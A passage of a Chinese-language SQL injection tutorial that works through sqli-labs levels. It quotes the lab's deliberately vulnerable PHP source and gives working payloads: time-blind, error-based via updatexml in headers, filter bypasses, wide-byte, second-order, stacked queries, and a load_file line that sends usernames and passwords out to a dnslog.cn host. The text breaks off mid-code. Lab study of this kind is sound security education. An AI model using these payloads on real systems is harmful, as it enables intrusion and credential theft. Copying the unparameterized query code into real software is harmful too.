正确回显和报错回显都没有</h4><p>不论你输入啥，他都会说 you are in</p><blockquote><p>就像你说 <code>啊对对对</code></p></blockquote><p>这样 布尔盲注也没法用了<br>你不知道注入语句是对是错<br>这时就要用时间盲注了<br>把布尔盲注再进行包装<br>if(布尔盲注语句,sleep(3),1)<br>正确的话，浏览器会延时 3 秒再运行<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254135027-77.png" alt="在这里插入图片描述"></p><h2 id="post-传参"><a class="markdownIt-Anchor" href="#post-传参"></a> POST 传参</h2><h3 id="先讲理论-2"><a class="markdownIt-Anchor" href="#先讲理论-2"></a> <code>先讲理论</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;</span><br><span class="line">&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">	    &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">		&lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;</span><br><span class="line">	&lt;/div&gt;&lt;/br&gt;</span><br><span class="line">	&lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">        `上面是前端 通过post传参uname和passwd`</span><br><span class="line">&lt;?php</span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">	$uname=$_POST[&#x27;uname&#x27;];</span><br><span class="line">	$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">/后端接收前端传的参数</span><br><span class="line">	//logging the connection parameters to a file for analysis.</span><br><span class="line">	$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">	fwrite($fp,&#x27;User Name:&#x27;.$uname);</span><br><span class="line">	fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\n&quot;);</span><br><span class="line">	fclose($fp);</span><br><span class="line">// connectivity</span><br><span class="line">	@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;;</span><br><span class="line">		//echo &quot; You Have successfully logged in\n\n &quot; ;</span><br><span class="line">		echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;;</span><br><span class="line">		/又是这里分成两部分，上面是正确回显</span><br><span class="line">		下面是报错回显</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;;</span><br><span class="line">		//echo &quot;Try again looser&quot;;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;;</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="post传参"><a class="markdownIt-Anchor" href="#post传参"></a> <code>post传参</code></h4><p>post 传参有很多方式最本质的就是在输入框传<br>然后是一些插件具有传参功能 hackbar 他们一般需要配合抓包的插件使用<br>较多的是一些抓包软件，burpsuit 等<br>他们既有抓包功能，也有重发器，测试器功能强大</p><h4 id="注入语句"><a class="markdownIt-Anchor" href="#注入语句"></a> <code>注入语句</code></h4><p>和 get 传参类型的语句大体相同，不同的地方有原来的 id=1’由于 get 传参，抓包后自动写入 uname/password=所以只需要写后面的 admin’ 加上 sql 执行语句，原理一样，都是让系统执行完传参后继续把 sql 语句执行来回显 这里末尾注释符可用#</p><h3 id="实操-2"><a class="markdownIt-Anchor" href="#实操-2"></a> 实操</h3><p>post 传参同样有三大类</p><h4 id="正误回显都有"><a class="markdownIt-Anchor" href="#正误回显都有"></a> 正误回显都有</h4><p>在 burpsuit 重发器里传参，<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254138419-80.png" alt="在这里插入图片描述"><br>红字部分即为注入语句，这里同样只展示最后一步 其他可按照 get 传参原理<br>只需改动小部分</p><h4 id="没正确回显-有报错回显"><a class="markdownIt-Anchor" href="#没正确回显-有报错回显"></a> 没正确回显 有报错回显</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254140293-83.png" alt="在这里插入图片描述">这里我采用了辨识度更高的时间盲注 布尔盲注同样使用</p><h4 id="正错回显都没有"><a class="markdownIt-Anchor" href="#正错回显都没有"></a> 正错回显都没有</h4><p>同上面直接时间盲注</p><h2 id="基于报错注入的各种传参方式"><a class="markdownIt-Anchor" href="#基于报错注入的各种传参方式"></a> 基于报错注入的各种传参方式</h2><h3 id="先讲报错注入"><a class="markdownIt-Anchor" href="#先讲报错注入"></a> <code>先讲报错注入</code></h3><h4 id="updatexml"><a class="markdownIt-Anchor" href="#updatexml"></a> updatexml</h4><p>updatexml (XML_document, XPath_string, new_value)<br>替换查找到的符合条件的数据</p><h4 id="extactvalue"><a class="markdownIt-Anchor" href="#extactvalue"></a> extactvalue</h4><p>extractvalue(XML_document, XPath_string)<br>对 XML 文档进行查询的函数<br>当上述两个函数的 xpath 路径出错时，将 XML_document 报错返回回来<br>注意只能返回 32 个字符，后面的可用 limit 等来限制返回的字符位置</p><h3 id="传参方式"><a class="markdownIt-Anchor" href="#传参方式"></a> <code>传参方式</code></h3><p>burp suite 抓包后改相应数据</p><h4 id="user-agent-注入"><a class="markdownIt-Anchor" href="#user-agent-注入"></a> user-agent 注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent:<span class="string">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="referer-注入"><a class="markdownIt-Anchor" href="#referer-注入"></a> referer 注入</h4><h4 id="cookie-注入"><a class="markdownIt-Anchor" href="#cookie-注入"></a> cookie 注入</h4><h4 id="base64-加密的-cookie-注入"><a class="markdownIt-Anchor" href="#base64-加密的-cookie-注入"></a> base64 加密的 cookie 注入</h4><p>将 payload 经 base64 加密后上传即可</p><h2 id="过滤注释的get"><a class="markdownIt-Anchor" href="#过滤注释的get"></a> <code>过滤注释的GET</code></h2><p>源码中过滤掉了注释符<br>注释符不能用了所以要在闭合上下功夫</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&#x27; union select 1,group_concat(username),group_concat(password) from users where 1 or &#x27;</span><span class="number">1</span><span class="string">&#x27; = &#x27;</span><span class="number">1</span></span><br><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,(select group_concat(username) from users),&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure><p>在末尾构造语句使闭合符号与语句组成一个不影响的语句<br>闭合方式多种多样</p><h2 id="二次注入"><a class="markdownIt-Anchor" href="#二次注入"></a> <code>二次注入</code></h2><p>首先注册一个用户 admin‘#<br>然后登录<br>修改密码<br>当你修改密码时 后台就执行了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> passwd<span class="operator">=</span>&quot;新密码&quot; <span class="keyword">WHERE</span> username <span class="operator">=</span><span class="string">&#x27; admin&#x27;</span> # <span class="string">&#x27; AND password=&#x27;</span></span><br></pre></td></tr></table></figure><p>也就是<br>你用 admin’#用户把 admin 用户的密码给改了</p><h2 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> <code>过滤</code></h2><h3 id="过滤-or-和-and"><a class="markdownIt-Anchor" href="#过滤-or-和-and"></a> 过滤 or 和 and</h3><p>将 payload 里所有 and 和 or<br>替换为 anandd 和 oorr<br>这里 password 也要变成 passwoorrd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="title function_ invoke__">group_concat</span>(<span class="title function_ invoke__">concat_ws</span>(<span class="number">0x7e</span>,username,passwoorrd)) <span class="keyword">from</span> users<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="过滤下的报错注入"><a class="markdownIt-Anchor" href="#过滤下的报错注入"></a> 过滤下的报错注入</h3><h4 id="26"><a class="markdownIt-Anchor" href="#26"></a> 26</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			/strip out <span class="title function_ invoke__">OR</span> (non <span class="keyword">case</span> sensitive)</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		/Strip out <span class="title function_ invoke__">AND</span> (non <span class="keyword">case</span> sensitive)</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		/strip out */</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		/Strip out --</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			/Strip out <span class="comment">#</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		/Strip out spaces</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		/Strip out slashes</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br></pre></td></tr></table></figure><p>要用到||代替 or information 里的 or 要双写，用||‘1’=‘1 来闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span><span class="string">&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;</span>security<span class="string">&#x27;))),1)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254143668-86.png" alt="在这里插入图片描述"></p><h4 id="27"><a class="markdownIt-Anchor" href="#27"></a> 27</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254145977-89.png" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span><span class="string">&#x27;||updatexml(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;</span>security<span class="string">&#x27;))),1)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>大小写 select 和 union</p><h3 id="过滤下的时间盲注"><a class="markdownIt-Anchor" href="#过滤下的时间盲注"></a> 过滤下的时间盲注</h3><p>26 到 27 关的 a 都是无法报错注入的<br>能用时间盲注过滤方法和不带 a 的关一样</p><h2 id="waf"><a class="markdownIt-Anchor" href="#waf"></a> <code>waf</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/ take the variables</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">	<span class="variable">$hint</span>=<span class="variable">$qs</span>;</span><br><span class="line">	<span class="variable">$id1</span>=<span class="title function_ invoke__">java_implimentation</span>(<span class="variable">$qs</span>);</span><br><span class="line">	<span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	<span class="comment">//echo $id1;</span></span><br><span class="line">	<span class="title function_ invoke__">whitelist</span>(<span class="variable">$id1</span>);&#125;</span><br><span class="line"></span><br><span class="line">/WAF implimentation with a whitelist approach..... only allows input to be Numeric.</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">		&#123;<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">			<span class="comment">//return $match;</span></span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">			<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">			&#125;</span><br><span class="line">&#125;</span><br><span class="line">/ The <span class="function"><span class="keyword">function</span> <span class="title">below</span> <span class="title">immitates</span> <span class="title">the</span> <span class="title">behavior</span> <span class="title">of</span> <span class="title">parameters</span> <span class="title">when</span> <span class="title">subject</span> <span class="title">to</span> <span class="title">HPP</span> (<span class="params">HTTP Parameter Pollution</span>).</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">		<span class="variable">$val</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java_implimentation 模拟 tomcat 的查询函数处理<br>whitelist 白名单过滤 检测到不符合规则就重定向<br>漏洞是 whitelist 只检测了 java_implimentation 输出的第一个参数$id_value<br>后面的逃过检测 注入点在后面<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254151996-92.png" alt="在这里插入图片描述"></p><h2 id="宽字节注入"><a class="markdownIt-Anchor" href="#宽字节注入"></a> <code>宽字节注入</code></h2><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。<br>urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254154496-95.png" alt="在这里插入图片描述"></p><h3 id="结束注释"><a class="markdownIt-Anchor" href="#结束注释"></a> <code>结束注释</code></h3><p>当转译为‘/时可用’/**/来<code>结束注释</code></p><h2 id="堆叠注入"><a class="markdownIt-Anchor" href="#堆叠注入"></a> <code>堆叠注入</code></h2><p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。结束一个 sql 语句后继续构造下一条语句，会一起执行 因此产生了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间区别在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句<br>堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在 SQL 注入中还是比较频繁的。<br>如下展示了堆叠注入插入了一个用户数据</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254157372-98.png" alt="在这里插入图片描述"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254159693-101.png" alt="在这里插入图片描述">同时也可以进行 dnslog 注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;;select load_file(concat(&#x27;</span><span class="comment">//&#x27;,(select hex(concat_ws(&#x27;~&#x27;,username,password)) from users limit 0,1),&#x27;.au0mvd.dnslog.cn/1.txt&#x27;));--+</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254161931-104.png" alt="在这里插入图片描述"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desc查看表结构的详细信息</span><br><span class="line">desc table_name;</span><br><span class="line">此处desc是describe的缩写，用法: desc 表名/查询语句</span><br></pre></td></tr></table></figure><p>handler 适用于 select 等过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line">handler handler_table read <span class="keyword">first</span>;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">……</span><br><span class="line">handler handler_table <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure><h2 id="二次注入进阶"><a class="markdownIt-Anchor" href="#二次注入进阶"></a> 二次注入进阶</h2><h3 id="需成功登录才能二次注入"><a class="markdownIt-Anchor" href="#需成功登录才能二次注入"></a> 需成功登录才能二次注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line"><span class="variable">$con1</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Check connection</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con1</span>))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       @<span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$con1</span>, <span class="variable">$dbname</span>) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">&quot;Unable to connect to the database ######: &quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="comment">/* execute multi query */</span></span><br><span class="line"> 	<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span> (@<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="comment">/* store first result set */</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$con1</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	 <span class="keyword">if</span>(<span class="variable">$row</span> = @<span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">	    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">	       <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span>&#123;</span><br><span class="line">	       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	 &#125;</span><br><span class="line">      